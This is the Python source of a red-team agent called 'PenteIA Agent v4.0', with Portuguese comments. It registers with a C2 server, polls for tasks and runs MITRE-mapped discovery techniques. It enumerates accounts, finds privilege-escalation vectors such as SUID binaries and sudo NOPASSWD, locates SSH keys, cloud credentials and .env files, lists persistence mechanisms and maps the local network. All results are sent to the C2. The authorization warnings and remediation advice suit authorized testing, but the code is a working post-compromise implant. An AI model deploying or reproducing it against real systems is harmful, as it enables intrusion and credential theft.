#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PenteIA Agent v4.0 — Agente de Red Team para checagem local (OS-level)

Uso:
    python3 penteia_agent.py --c2 http://PENTEIA_IP:8000 --token JWT_TOKEN --user-id USER_ID
    python3 penteia_agent.py --c2 http://192.168.1.10:8000 --token eyJ... --user-id bd7e7dd9-... --once

AVISO: Use APENAS em ambientes que você tem autorização para testar.
       Testes sem autorização são ilegais e antiéticos.
"""

import os, sys, platform, socket, subprocess, json, time, getpass, threading
import urllib.request, urllib.error, argparse, re
from datetime import datetime

# ── Config (sobrescrita por args) ─────────────────────────────────────────────
C2_URL = ""
API_TOKEN = ""
USER_ID = ""
POLL_INTERVAL = 5
AGENT_ID = None

# ── HTTP helper ───────────────────────────────────────────────────────────────

def _http(method, path, data=None, timeout=10):
    url = f"{C2_URL}{path}"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {API_TOKEN}",
        "User-Agent": "PenteIA-Agent/4.0",
    }
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        return {"error": f"HTTP {e.code}"}
    except Exception as e:
        return {"error": str(e)}

# ── Técnicas OS-level ─────────────────────────────────────────────────────────

def technique_system_info():
    """T1082 — System Information Discovery"""
    info = {
        "hostname":       socket.gethostname(),
        "os":             platform.system(),
        "os_version":     platform.version()[:120],
        "os_release":     platform.release(),
        "arch":           platform.machine(),
        "processor":      platform.processor()[:80],
        "python":         sys.version.split()[0],
        "username":       getpass.getuser(),
        "pid":            os.getpid(),
        "cwd":            os.getcwd(),
    }
    try:
        info["env_sensitive"] = [k for k in os.environ
                                  if any(x in k.upper() for x in ("PATH","HOME","USER","SHELL","TEMP"))]
    except Exception:
        pass

    return {
        "technique": "T1082", "name": "System Information Discovery",
        "status": "found", "cvss_score": 5.3, "cvss_severity": "Medium",
        "compliance": ["OWASP A05:2021", "NIST SI-7", "PCI-DSS 6.3"],
        "detail": f"{info['os']} {info['os_release']} | Host: {info['hostname']} | User: {info['username']}",
        "data": info,
        "remediation": "Restringir informações de sistema expostas. Implementar controles de acesso para recursos de diagnóstico.",
    }


def technique_user_enum():
    """T1087 — Account Discovery"""
    users, priv_groups = [], []
    is_win = platform.system() == "Windows"

    if is_win:
        try:
            raw = subprocess.check_output("net user", shell=True, stderr=subprocess.DEVNULL, timeout=10).decode(errors="ignore")
            for line in raw.splitlines():
                line = line.strip()
                if line and "---" not in line and "The command" not in line and "accounts for" not in line and "User accounts for" not in line:
                    users.extend(line.split())
        except Exception:
            pass
        try:
            raw = subprocess.check_output("net localgroup administrators", shell=True, stderr=subprocess.DEVNULL, timeout=10).decode(errors="ignore")
            for line in raw.splitlines():
                line = line.strip()
                if line and "---" not in line and "alias name" not in line.lower() and "comment" not in line.lower() and "the command" not in line.lower() and "members" not in line.lower():
                    priv_groups.append(line)
        except Exception:
            pass
    else:
        try:
            with open("/etc/passwd") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 4:
                        try:
                            uid = int(parts[2])
                            if uid >= 1000 or uid == 0:
                                users.append({"user": parts[0], "uid": uid, "shell": parts[6] if len(parts) > 6 else ""})
                        except ValueError:
                            pass
        except Exception:
            pass
        try:
            with open("/etc/group") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 4 and parts[3]:
                        try:
                            if int(parts[2]) == 0 or parts[0] in ("sudo", "wheel", "admin", "docker"):
                                priv_groups.append({"group": parts[0], "members": parts[3]})
                        except ValueError:
                            pass
        except Exception:
            pass

    found = len(users) > 0
    return {
        "technique": "T1087", "name": "Account Discovery",
        "status": "found" if found else "blocked",
        "cvss_score": 5.3 if found else 0.0, "cvss_severity": "Medium",
        "compliance": ["OWASP A01:2021", "NIST AC-2", "PCI-DSS 8.2"],
        "detail": f"{len(users)} usuários enumerados | {len(priv_groups)} entradas em grupos privilegiados",
        "data": {"users": users[:30], "privileged_groups": priv_groups[:10]},
        "remediation": "Restringir enumeração de usuários locais. Auditar membros de grupos privilegiados. Implementar PAM.",
    }


def technique_priv_escalation():
    """T1548 / T1069 — Privilege Escalation Vectors"""
    findings = []
    is_win = platform.system() == "Windows"

    if not is_win:
        # Sudo sem senha
        try:
            out = subprocess.check_output(["sudo", "-l", "-n"], stderr=subprocess.STDOUT, timeout=8).decode(errors="ignore")
            if "NOPASSWD" in out:
                cmd = out.split("NOPASSWD")[-1].strip()[:80]
                findings.append({"type": "sudo_nopasswd", "detail": f"NOPASSWD: {cmd}"})
        except Exception:
            pass

        # SUID binaries exploitáveis
        try:
            out = subprocess.check_output(
                "find / -perm -4000 -type f 2>/dev/null",
                shell=True, timeout=20, stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            dangerous = ["python", "perl", "ruby", "vim", "vi", "less", "more", "find", "awk", "tee",
                         "cp", "mv", "bash", "sh", "nmap", "tcpdump", "env", "zip", "tar", "curl", "wget"]
            for binary in out.splitlines():
                binary = binary.strip()
                name = os.path.basename(binary).lower()
                if any(d in name for d in dangerous):
                    findings.append({"type": "suid_exploitable", "detail": binary})
        except Exception:
            pass

        # World-writable em /etc
        try:
            out = subprocess.check_output(
                "find /etc -writable -type f 2>/dev/null | head -5",
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            for f in out.splitlines():
                if f.strip():
                    findings.append({"type": "writable_etc", "detail": f.strip()})
        except Exception:
            pass

        # Capabilities perigosas
        try:
            out = subprocess.check_output(
                "getcap -r / 2>/dev/null | head -10",
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            for line in out.splitlines():
                if "cap_setuid" in line or "cap_net_raw" in line or "cap_dac_override" in line:
                    findings.append({"type": "dangerous_capability", "detail": line.strip()})
        except Exception:
            pass

    else:
        # Windows: privilégios perigosos habilitados
        try:
            out = subprocess.check_output("whoami /priv", shell=True, timeout=8).decode(errors="ignore")
            dangerous_privs = [
                "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
                "SeTcbPrivilege", "SeDebugPrivilege", "SeBackupPrivilege",
                "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
            ]
            for priv in dangerous_privs:
                if priv in out:
                    segment = out.split(priv)[1][:60]
                    if "Enabled" in segment:
                        findings.append({"type": "windows_priv", "detail": priv})
        except Exception:
            pass

        # AlwaysInstallElevated
        for reg_path in (
            "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
            "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        ):
            try:
                out = subprocess.check_output(
                    f"reg query {reg_path} /v AlwaysInstallElevated 2>nul",
                    shell=True, timeout=5
                ).decode(errors="ignore")
                if "0x1" in out:
                    findings.append({"type": "always_install_elevated", "detail": reg_path})
            except Exception:
                pass

    found = len(findings) > 0
    return {
        "technique": "T1548", "name": "Privilege Escalation Vectors",
        "status": "found" if found else "blocked",
        "cvss_score": 7.8 if found else 0.0, "cvss_severity": "High",
        "compliance": ["OWASP A01:2021", "NIST AC-6", "PCI-DSS 7.1", "LGPD Art.46"],
        "detail": f"{len(findings)} vetores de escalonamento: {findings[0]['detail'][:70]}" if findings else "Nenhum vetor óbvio de privilege escalation encontrado",
        "data": {"findings": findings},
        "remediation": "Auditar SUID/capabilities binaries. Configurar sudo com princípio do menor privilégio. Implementar Just-in-Time access.",
    }


def technique_cred_hunt():
    """T1552 — Unsecured Credentials"""
    sources = []

    # Arquivos com credenciais conhecidos
    check_paths = [
        ("~/.bash_history",     "histórico bash"),
        ("~/.zsh_history",      "histórico zsh"),
        ("~/.ssh/id_rsa",       "chave SSH privada RSA"),
        ("~/.ssh/id_ecdsa",     "chave SSH privada ECDSA"),
        ("~/.ssh/id_ed25519",   "chave SSH privada Ed25519"),
        ("~/.aws/credentials",  "credenciais AWS"),
        ("~/.gcloud/credentials.db", "credenciais GCloud"),
        ("~/.azure/accessTokens.json", "tokens Azure"),
        (".env",                "arquivo .env"),
        ("../.env",             "arquivo .env (parent)"),
        ("config/database.yml", "config banco de dados (Rails)"),
        ("wp-config.php",       "config WordPress"),
        ("settings.py",         "settings Python"),
        ("application.properties", "config Spring Boot"),
        ("appsettings.json",    "config .NET"),
    ]
    kw = ["password", "passwd", "secret", "token", "api_key", "apikey", "private_key",
          "credential", "access_key", "client_secret", "db_pass", "database_url"]

    for rel_path, label in check_paths:
        full = os.path.expanduser(rel_path)
        if os.path.isfile(full):
            try:
                with open(full, "r", errors="ignore") as f:
                    content = f.read(8192).lower()
                hits = [k for k in kw if k in content]
                if hits or "id_rsa" in label or "id_ecdsa" in label or "id_ed25519" in label:
                    sources.append({
                        "path": full,
                        "label": label,
                        "keywords_found": hits[:5],
                        "size": os.path.getsize(full),
                    })
            except Exception:
                pass

    # Variáveis de ambiente sensíveis
    sensitive_env = {k: "***" for k in os.environ
                     if any(x in k.upper() for x in ("PASSWORD","SECRET","TOKEN","KEY","PASS","CREDENTIAL","PWD","DSN"))}
    if sensitive_env:
        sources.append({"path": "ENV", "label": "variáveis de ambiente sensíveis", "keywords_found": list(sensitive_env.keys())[:10]})

    # Windows Credential Manager
    if platform.system() == "Windows":
        try:
            out = subprocess.check_output("cmdkey /list", shell=True, timeout=5, stderr=subprocess.DEVNULL).decode(errors="ignore")
            count = out.count("Target:")
            if count:
                sources.append({"path": "Windows Credential Manager", "label": f"{count} credenciais armazenadas", "keywords_found": []})
        except Exception:
            pass

    found = len(sources) > 0
    return {
        "technique": "T1552", "name": "Credential Hunting",
        "status": "found" if found else "blocked",
        "cvss_score": 8.8 if found else 0.0, "cvss_severity": "High",
        "compliance": ["OWASP A02:2021", "NIST IA-5", "PCI-DSS 8.3.1", "LGPD Art.46"],
        "detail": f"{len(sources)} fontes com credenciais expostas" if found else "Nenhuma credencial exposta nos caminhos padrão",
        "data": {"sources": sources},
        "remediation": "Remover credenciais de histórico, arquivos de config e variáveis de ambiente. Usar secrets manager (Vault, AWS SM, KMS).",
    }


def technique_persistence():
    """T1053 / T1543 — Persistence Mechanisms"""
    mechanisms = []
    is_win = platform.system() == "Windows"

    if not is_win:
        # Crontab do usuário
        try:
            out = subprocess.check_output("crontab -l 2>/dev/null", shell=True, timeout=5).decode(errors="ignore")
            entries = [l for l in out.splitlines() if l.strip() and not l.startswith("#")]
            if entries:
                mechanisms.append({"type": "user_crontab", "count": len(entries), "sample": entries[:3]})
        except Exception:
            pass

        # Cron do sistema
        for d in ("/etc/cron.d", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"):
            if os.path.isdir(d):
                try:
                    files = [f for f in os.listdir(d) if not f.startswith(".")]
                    if files:
                        mechanisms.append({"type": "system_cron", "dir": d, "files": files})
                except Exception:
                    pass

        # Systemd user units
        user_systemd = os.path.expanduser("~/.config/systemd/user")
        if os.path.isdir(user_systemd):
            try:
                units = os.listdir(user_systemd)
                if units:
                    mechanisms.append({"type": "systemd_user_units", "units": units})
            except Exception:
                pass

        # /etc/rc.local
        if os.path.isfile("/etc/rc.local"):
            try:
                with open("/etc/rc.local") as f:
                    content = f.read(2048)
                if len(content.strip()) > 10:
                    mechanisms.append({"type": "rc_local", "content_preview": content[:200]})
            except Exception:
                pass

        # Contagem de serviços systemd ativos
        try:
            out = subprocess.check_output(
                "systemctl list-units --type=service --state=running --no-pager 2>/dev/null",
                shell=True, timeout=10
            ).decode(errors="ignore")
            count = out.count(".service")
            mechanisms.append({"type": "systemd_services_running", "count": count})
        except Exception:
            pass

    else:
        # Windows Scheduled Tasks
        try:
            out = subprocess.check_output("schtasks /query /fo LIST 2>nul", shell=True, timeout=15).decode(errors="ignore")
            task_count = out.count("TaskName:")
            if task_count:
                mechanisms.append({"type": "scheduled_tasks", "count": task_count})
        except Exception:
            pass

        # Run keys no registro
        for reg_path in (
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        ):
            try:
                out = subprocess.check_output(f"reg query {reg_path} 2>nul", shell=True, timeout=5).decode(errors="ignore")
                entries = [l.strip() for l in out.splitlines() if "REG_" in l]
                if entries:
                    mechanisms.append({"type": "registry_run_key", "path": reg_path, "entries": entries[:5]})
            except Exception:
                pass

        # Startup folder
        startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if os.path.isdir(startup):
            try:
                files = os.listdir(startup)
                if files:
                    mechanisms.append({"type": "startup_folder", "files": files})
            except Exception:
                pass

    found = any(m["type"] not in ("systemd_services_running",) for m in mechanisms)
    return {
        "technique": "T1053", "name": "Persistence Mechanisms",
        "status": "found" if found else "blocked",
        "cvss_score": 6.5 if found else 0.0, "cvss_severity": "Medium",
        "compliance": ["OWASP A01:2021", "NIST CM-7", "PCI-DSS 6.4.3"],
        "detail": f"{len(mechanisms)} mecanismos de persistência detectados" if mechanisms else "Nenhum mecanismo de persistência não-padrão encontrado",
        "data": {"mechanisms": mechanisms},
        "remediation": "Auditar e remover tarefas agendadas, run keys e serviços não autorizados. Implementar monitoramento de persistência com EDR.",
    }


def technique_network_recon():
    """T1016 / T1046 — Network Reconnaissance"""
    data = {}
    is_win = platform.system() == "Windows"

    # IP local
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        data["local_ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        data["local_ip"] = "unknown"

    # Interfaces / configuração de rede
    try:
        cmd = "ipconfig /all" if is_win else "ip addr 2>/dev/null || ifconfig 2>/dev/null"
        out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
        ips_found = re.findall(r'\b(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.(?:\d{1,3}\.)\d{1,3}\b', out)
        data["private_ips"] = list(set(ips_found))
    except Exception:
        data["private_ips"] = []

    # Tabela ARP (hosts na rede local)
    try:
        cmd = "arp -a" if is_win else "arp -n 2>/dev/null || ip neigh 2>/dev/null"
        out = subprocess.check_output(cmd, shell=True, timeout=8).decode(errors="ignore")
        neighbors = list(set(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', out)))
        data["arp_neighbors"] = neighbors
        data["network_size"] = len(neighbors)
    except Exception:
        data["arp_neighbors"] = []
        data["network_size"] = 0

    # Portas abertas no localhost (quick scan)
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443, 445,
                    1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
    open_ports = []
    for port in common_ports:
        try:
            s = socket.socket()
            s.settimeout(0.3)
            if s.connect_ex(("127.0.0.1", port)) == 0:
                open_ports.append(port)
            s.close()
        except Exception:
            pass
    data["localhost_open_ports"] = open_ports

    # Gateway padrão
    try:
        if is_win:
            out = subprocess.check_output("route print 0.0.0.0", shell=True, timeout=5).decode(errors="ignore")
        else:
            out = subprocess.check_output("ip route 2>/dev/null || route -n 2>/dev/null", shell=True, timeout=5).decode(errors="ignore")
        gateways = re.findall(r'(?:via\s+|0\.0\.0\.0\s+)(\d{1,3}(?:\.\d{1,3}){3})', out)
        data["gateways"] = list(set(gateways))
    except Exception:
        data["gateways"] = []

    found = len(data.get("arp_neighbors", [])) > 1 or len(open_ports) > 3
    return {
        "technique": "T1016", "name": "Network Reconnaissance",
        "status": "found" if found else "blocked",
        "cvss_score": 5.3, "cvss_severity": "Medium",
        "compliance": ["OWASP A01:2021", "NIST SC-5", "PCI-DSS 11.3"],
        "detail": f"IP: {data.get('local_ip')} | {len(data.get('arp_neighbors',[]))} vizinhos ARP | Portas abertas: {open_ports[:8]}",
        "data": data,
        "remediation": "Segmentar rede com VLANs e firewalls. Implementar NDR para detecção de reconhecimento lateral.",
    }


def technique_process_enum():
    """T1057 — Process Discovery"""
    processes = []
    suspicious = []
    is_win = platform.system() == "Windows"

    sus_keywords = [
        "mimikatz", "procdump", "psexec", "wce", "lazagne", "pwdump",
        "hashdump", "meterpreter", "cobalt", "empire", "metasploit",
        "netcat", "ncat", "socat", "chisel", "frp", "ngrok",
    ]

    try:
        if is_win:
            out = subprocess.check_output("tasklist /fo CSV /nh 2>nul", shell=True, timeout=10).decode(errors="ignore")
        else:
            out = subprocess.check_output("ps aux 2>/dev/null", shell=True, timeout=10).decode(errors="ignore")

        for line in out.splitlines()[:60]:
            line = line.strip()
            if not line:
                continue
            line_lower = line.lower()
            for kw in sus_keywords:
                if kw in line_lower:
                    suspicious.append({"process": line[:120], "keyword": kw})
                    break
            processes.append(line[:100])
    except Exception:
        pass

    found = len(suspicious) > 0
    return {
        "technique": "T1057", "name": "Process Discovery",
        "status": "found" if found else "blocked",
        "cvss_score": 6.5 if found else 3.1, "cvss_severity": "Medium" if found else "Low",
        "compliance": ["OWASP A01:2021", "NIST SI-4"],
        "detail": f"{len(suspicious)} processos suspeitos: {suspicious[0]['process'][:60]}" if found else f"{len(processes)} processos em execução, nenhum suspeito",
        "data": {"total_processes": len(processes), "suspicious": suspicious, "sample": processes[:15]},
        "remediation": "Implementar application allowlisting (AppLocker/WDAC). Monitorar criação de processos com EDR/SIEM.",
    }


def technique_sensitive_files():
    """T1083 — Sensitive File Discovery"""
    found_files = []

    targets = [
        ("~/.ssh/id_rsa",               "Chave SSH privada RSA"),
        ("~/.ssh/id_ecdsa",             "Chave SSH privada ECDSA"),
        ("~/.ssh/id_ed25519",           "Chave SSH privada Ed25519"),
        ("~/.aws/credentials",          "Credenciais AWS"),
        ("~/.aws/config",               "Config AWS"),
        ("~/.gcloud/credentials.db",    "Credenciais GCloud"),
        ("~/.azure/accessTokens.json",  "Tokens Azure"),
        (".env",                         "Arquivo .env"),
        ("../.env",                      "Arquivo .env (pai)"),
        ("/etc/shadow",                  "Shadow de senhas Linux"),
        ("/etc/passwd",                  "Lista de usuários Linux"),
        ("config/database.yml",         "Config banco Rails"),
        ("wp-config.php",               "Config WordPress"),
        ("settings.py",                 "Settings Django"),
        ("appsettings.json",            "Config .NET"),
        ("application.properties",      "Config Spring Boot"),
        ("web.config",                  "Config IIS"),
        ("/proc/version",               "Versão do kernel Linux"),
    ]

    for rel_path, label in targets:
        full = os.path.expanduser(rel_path)
        if os.path.isfile(full):
            try:
                size = os.path.getsize(full)
                readable = os.access(full, os.R_OK)
                found_files.append({
                    "path":     full,
                    "label":    label,
                    "size":     size,
                    "readable": readable,
                })
            except Exception:
                pass

    found = len(found_files) > 0
    return {
        "technique": "T1083", "name": "Sensitive File Discovery",
        "status": "found" if found else "blocked",
        "cvss_score": 7.5 if found else 0.0, "cvss_severity": "High",
        "compliance": ["OWASP A02:2021", "NIST SC-28", "PCI-DSS 3.4", "LGPD Art.46"],
        "detail": f"{len(found_files)} arquivos sensíveis acessíveis" if found else "Nenhum arquivo sensível encontrado nos caminhos padrão",
        "data": {"files": found_files},
        "remediation": "Aplicar permissões restritivas (chmod 600). Mover credenciais para secrets manager. Remover arquivos de configuração desnecessários.",
    }


# ── Mapa de técnicas ──────────────────────────────────────────────────────────

TECHNIQUE_MAP = {
    "T1082": technique_system_info,
    "T1087": technique_user_enum,
    "T1548": technique_priv_escalation,
    "T1552": technique_cred_hunt,
    "T1053": technique_persistence,
    "T1016": technique_network_recon,
    "T1057": technique_process_enum,
    "T1083": technique_sensitive_files,
}

ALL_TECHNIQUES = list(TECHNIQUE_MAP.keys())

# ── Loop de comunicação com C2 ────────────────────────────────────────────────

def register():
    global AGENT_ID
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "127.0.0.1"

    payload = {
        "user_id":        USER_ID,
        "hostname":       socket.gethostname(),
        "ip":             local_ip,
        "os_info":        f"{platform.system()} {platform.release()}",
        "username":       getpass.getuser(),
        "python_version": sys.version.split()[0],
    }
    resp = _http("POST", "/api/agents/register", payload)
    if "agent_id" in resp:
        AGENT_ID = resp["agent_id"]
        print(f"[+] Agente registrado: {AGENT_ID}")
        return True
    print(f"[-] Falha ao registrar: {resp}")
    return False


def run_technique(technique_id):
    fn = TECHNIQUE_MAP.get(technique_id)
    if not fn:
        return {"technique": technique_id, "status": "failed", "error": "Técnica não implementada"}
    try:
        return fn()
    except Exception as e:
        return {"technique": technique_id, "name": technique_id, "status": "failed", "error": str(e), "cvss_score": 0.0}


def poll_and_execute():
    print("[*] Modo poll — aguardando tarefas do C2 (Ctrl+C para parar)...")
    while True:
        try:
            resp = _http("GET", f"/api/agents/{AGENT_ID}/tasks")
            for task in resp.get("tasks", []):
                task_id  = task["id"]
                tech     = task["technique"]
                print(f"  [*] Executando {tech}...")
                result = run_technique(tech)
                _http("POST", f"/api/agents/tasks/{task_id}/result", {"result": result})
                icon = "[VULN]" if result.get("status") == "found" else "[SAFE]"
                print(f"  {icon} {tech}: {result.get('detail','')[:75]}")
        except KeyboardInterrupt:
            print("\n[*] Agente parado pelo usuário.")
            break
        except Exception as e:
            print(f"  [-] Poll error: {e}")

        try:
            _http("POST", f"/api/agents/{AGENT_ID}/heartbeat", {})
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)


def run_once():
    print("[*] Modo --once: executando todas as técnicas e enviando resultados...")
    results = []
    for tech_id in ALL_TECHNIQUES:
        print(f"  [*] {tech_id}...")
        r = run_technique(tech_id)
        results.append(r)
        icon = "[VULN]" if r.get("status") == "found" else ("[FAIL]" if r.get("status") == "failed" else "[SAFE]")
        print(f"  {icon} {tech_id}: {r.get('detail','')[:75]}")

    resp = _http("POST", f"/api/agents/{AGENT_ID}/batch-result", {"results": results})
    print(f"\n[+] Resultados enviados: {resp}")
    return results


# ── Entrypoint ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PenteIA Agent v4.0 — Use apenas em ambientes autorizados"
    )
    parser.add_argument("--c2",      required=True,       help="URL do servidor C2 (ex: http://192.168.1.10:8000)")
    parser.add_argument("--token",   required=True,       help="JWT token de autenticação PenteIA")
    parser.add_argument("--user-id", required=True,       help="ID do usuário PenteIA")
    parser.add_argument("--once",    action="store_true", help="Executar todas as técnicas uma vez e sair")
    parser.add_argument("--interval", type=int, default=5, help="Intervalo de poll em segundos (default: 5)")
    args = parser.parse_args()

    C2_URL        = args.c2.rstrip("/")
    API_TOKEN     = args.token
    USER_ID       = args.user_id
    POLL_INTERVAL = args.interval

    print("=" * 60)
    print("  PenteIA Agent v4.0 — Red Team OS-level Assessment")
    print("  AVISO: Use apenas em ambientes autorizados")
    print("=" * 60)
    print(f"  C2:     {C2_URL}")
    print(f"  Host:   {socket.gethostname()} ({platform.system()} {platform.release()})")
    print(f"  User:   {getpass.getuser()}")
    print(f"  Python: {sys.version.split()[0]}")
    print("=" * 60)
    print()

    if not register():
        print("[-] Não foi possível conectar ao C2. Verifique URL e token.")
        sys.exit(1)

    if args.once:
        run_once()
    else:
        poll_and_execute()
